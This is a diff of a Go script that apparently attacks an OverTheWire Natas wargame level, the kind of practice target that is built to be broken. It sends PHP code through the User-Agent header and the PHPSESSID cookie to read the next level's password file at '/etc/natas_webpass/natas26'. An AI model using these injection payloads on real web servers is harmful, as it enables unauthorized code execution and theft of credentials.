@@ -10,7 +10,7 @@ import (
 
 func main() {
 
-	result("?")
+	result("?x1=1&y1=1&x2=300&y2=300")
 }
 
 func result(xx string) bool {
@@ -26,8 +26,12 @@ func result(xx string) bool {
 		baseURL+query, nil)
 	req.Header.Add("Authorization", "Basic "+basicAuth(usr, psw))
 
-	req.Header.Set("User-Agent", "<?php include('/etc/natas_webpass/natas26') ?>")
-	cookie := http.Cookie{Name: "PHPSESSID", Value: "Clouz"}
+	req.Header.Set("User-Agent", "Clouz>")
+	//cookie := http.Cookie{Name: "PHPSESSID", Value: "(new Logger('Clouz'))->Log('ciao').'Clouz'"}
+	//cookie := http.Cookie{Name: "PHPSESSID", Value: "setcookie('pass',file_get_contents('/etc/natas_webpass/natas26'))"}
+	cookie := http.Cookie{Name: "PHPSESSID", Value: "file_get_contents(\"/etc/natas_webpass/natas26\")"}
+	//cookie := http.Cookie{Name: "PHPSESSID", Value: "print_r(\"ciao\")"}
+
 	req.AddCookie(&cookie)
 
 	res, _ := client.Do(req)
